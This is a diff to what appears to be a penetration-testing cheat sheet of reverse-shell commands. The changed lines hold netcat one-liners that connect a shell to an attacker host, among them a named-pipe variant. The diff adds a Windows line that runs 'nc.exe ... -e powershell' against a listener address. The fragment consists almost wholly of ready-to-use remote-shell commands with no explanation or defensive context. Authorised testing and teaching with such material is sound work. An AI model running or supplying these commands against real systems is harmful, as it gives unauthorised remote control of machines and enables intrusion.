@@ -274,12 +274,16 @@ You’ll need to authorise the target to connect to you (command also run on you
 xhost +targetip
 ```
 
-## Netcat Reverse Shell:
+## Netcat Reverse Shell Linux:
 ```
 nc -e /bin/sh 10.0.0.1 1234
 nc -c /bin/sh attackerip 4444
 /bin/sh | nc attackerip 4444
 rm -f /tmp/p; mknod /tmp/p p && nc attackerip 4444 0/tmp/p
+```
+## Netcat Reverse Shell Windows:
+```
+nc.exe 10.10.14.150 1234 -e powershell
 ```
 ## Telnet:
 ```
